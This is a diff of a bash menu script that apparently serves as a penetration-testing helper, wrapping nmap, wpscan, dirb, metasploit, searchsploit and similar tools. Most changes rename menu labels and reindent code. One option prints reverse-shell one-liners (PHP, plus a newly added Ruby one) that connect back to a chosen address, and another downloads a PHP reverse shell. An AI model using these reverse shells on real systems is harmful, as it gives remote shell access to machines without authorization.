@@ -39,21 +39,21 @@ read url
 
 echo -e "${WHITE}"
 PS3='Choose what to do ---> '
-options=("SPAWN NEW TERMINAL" "OPENVPN" "KILLVPN" "NET INTERFACES" "OPEN IN BROWSER" "HARVESTING" "HASH IDENTIFIER" "SHELL TTY" "REVERSE_SHELL_PHP" "REVERSE SHELL CHEAT SHEETS" "INTENSE SCAN" "FAST SCAN" "CUSTOM SCAN" "WORDPRESS SCAN" "DIRB" "OPEN METASPLOIT" "OPEN WIRESHARK" "SEARCH A PUBLIC EXPLOIT" "GTFOBins" "SSH" "FTP" "Quit")
+options=("Spawn new terminal" "OpenVPN" "KillVPN" "Net interfaces" "Open in browser" "Harvesting" "Hash identifier" "Shell TTY" "Reverse_shell_php" "Reverse shell cheat sheets" "Intense scan" "Fast scan" "Custom scan" "Wordpress scan" "Dirb" "Open metasploit" "Open wireshark" "Search a public exploit" "GTFOBins" "Ssh" "Ftp" "Quit")
 
 select opt in "${options[@]}"
 do
     case $opt in
-        "SPAWN NEW TERMINAL")
+        "Spawn new terminal")
             qterminal &
             ;;
-        "OPENVPN")
+        "OpenVPN")
             echo -e "${YELLOW} Digit the name and the path of vpn file"
             read fileovpn
             openvpn $fileovpn &
             echo -e "${WHITE}"
             ;;
-        "KILLVPN")
+        "KillVPN")
             echo -e "${YELLOW}"
             ps aux | grep openvpn
             echo "Please digit the vpn pid"
@@ -61,12 +61,12 @@ do
             kill -9 $pid
             echo -e "${WHITE}"
             ;;  
-        "NET INTERFACES")
+        "Net interfaces")
             echo -e "${YELLOW}"
             ip a
             echo -e "${WHITE}"
             ;;
-        "OPEN IN BROWSER")
+        "Open in browser")
             echo -e "${YELLOW}"
             echo "Type your low privilege user"
             read utente
@@ -75,7 +75,7 @@ do
             runuser -u $utente -- firefox $url:$portweb &
             echo -e "${WHITE}"
             ;;   
-        "HARVESTING")
+        "Harvesting")
             echo -e "${YELLOW}"
             echo "usage: theHarvester [-h] -d DOMAIN [-l LIMIT] [-S START] [-g] [-p] [-s] [--screenshot SCREENSHOT] [-v]
                     [-e DNS_SERVER] [-t DNS_TLD] [-r] [-n] [-c] [-f FILENAME] [-b SOURCE]
@@ -86,24 +86,24 @@ do
             theHarvester $input
             echo -e "${WHITE}"     
             ;;    
-        "HASH IDENTIFIER")
+        "Hash identifier")
             echo ""
             echo -e "${RED}Press ctrl +c to return in the main menu"
             echo -e "${YELLOW}"
             hash-identifier
             echo -e "${WHITE}"
             ;;
-        "SHELL TTY")
+        "Shell TTY")
             echo -e "${YELLOW}"
             echo 'python -c' 'import pty; pty.spawn("/bin/sh")'
             echo -e "${WHITE}"
             ;;       
-        "REVERSE_SHELL_PHP")
+        "Reverse_shell_php")
             echo -e "${YELLOW}"
             wget pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
             echo -e "${WHITE}"
             ;;
-        "REVERSE SHELL CHEAT SHEETS")
+        "Reverse shell cheat sheets")
             echo -e "${YELLOW}"
             echo  "Type net interface that you want to use:" 
             read nic
@@ -157,78 +157,83 @@ do
             echo ""
             echo -e "${RED}PHP:"
             echo -e "${LCYAN}php -r '\$sock=fsockopen(${RED}\"$address\",$localport${LCYAN});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            echo ""
+            echo -e "${RED}RUBY:"
+            echo -e "${LCYAN}ruby -rsocket -e'f=TCPSocket.open(${RED}\"$address\",$localport${LCYAN}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
             echo -e "${WHITE}"
             ;;
             
-          "INTENSE SCAN")
+          "Intense scan")
             echo -e "${YELLOW}"
             nmap -A -Pn $url
             echo -e "${WHITE}"
             ;;
-         "FAST SCAN")
+          "Fast scan")
             echo -e "${YELLOW}"
             nmap -Pn -T4 -F $url
             echo -e "${WHITE}"
             ;;
-        "CUSTOM SCAN")
+          "Custom scan")
             echo -e "${YELLOW} Just type the nmap tags and hit enter to start the custom scan"
             read scan
             nmap $scan $url
             echo -e "${WHITE}"
             ;;    
-        "WORDPRESS SCAN")
+          "Wordpress scan")
             echo -e "${YELLOW}"
             wpscan --url http://$url
             echo -e "${WHITE}"
             ;;   
-        "DIRB")
+          "Dirb")
             echo -e "${YELLOW}"
             echo "Insert a port: "
             read port1
             dirb http://$url/$port1
             echo -e "${WHITE}"
-             ;;
-        "OPEN METASPLOIT")
-             msfconsole -q
-             ;;
-        "OPEN WIRESHARK")
-             echo "Press enter to return to the main menu"
+            ;;
+          "Open metasploit")
+            echo -e "${YELLOW}Type exit to return to the main menu"
+            msfconsole -q
+            echo -e "${WHITE}"
+            ;;
+          "Open wireshark")
+            echo "Press enter to return to the main menu"
              wireshark &
              ;;     
-        "SEARCH A PUBLIC EXPLOIT")
-             echo -e "${YELLOW}"
-             echo "Please digit a service to exploit:"
-             read cve
-             searchsploit $cve
-             echo -e "${WHITE}"
-             ;;
-        "GTFOBins")
-             echo -e "${GREEN1}"
-             echo "GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions"
-             echo "in misconfigured systems"
-             echo -e "${YELLOW}"
-             echo "Type your low privilege user"
-             read utente1
-             runuser -u $utente1 -- firefox https://gtfobins.github.io/ &
-             echo -e "${WHITE}"
-             ;;
+          "Search a public exploit")
+            echo -e "${YELLOW}"
+            echo "Please digit a service to exploit:"
+            read cve
+            searchsploit $cve
+            echo -e "${WHITE}"
+            ;;
+          "GTFOBins")
+            echo -e "${GREEN1}"
+            echo "GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions"
+            echo "in misconfigured systems"
+            echo -e "${YELLOW}"
+            echo "Type your low privilege user"
+            read utente1
+            runuser -u $utente1 -- firefox https://gtfobins.github.io/ &
+            echo -e "${WHITE}"
+            ;;
 
-        "SSH")
-             echo -e "${YELLOW}"
-             echo "Please digit ssh-user"
-             read user
-             echo "Please digit ssh-port"
-             read port
-             ssh $user@$url -p $port
-             echo -e "${WHITE}"
+          "Ssh")
+            echo -e "${YELLOW}"
+            echo "Please digit ssh-user"
+            read user
+            echo "Please digit ssh-port"
+            read port
+            ssh $user@$url -p $port
+            echo -e "${WHITE}"
              
-             ;;
-        "FTP")
-             echo -e "${YELLOW}"
-             ftp $url
-             echo -e "${YELLOW}"
-             ;;             
-        "Quit")
+            ;;
+         "Ftp")
+            echo -e "${YELLOW}"
+            ftp $url
+            echo -e "${YELLOW}"
+            ;;             
+         "Quit")
             break
             ;;
         *) echo -e "${YELLOW}INVALID OPTION --> $REPLY"
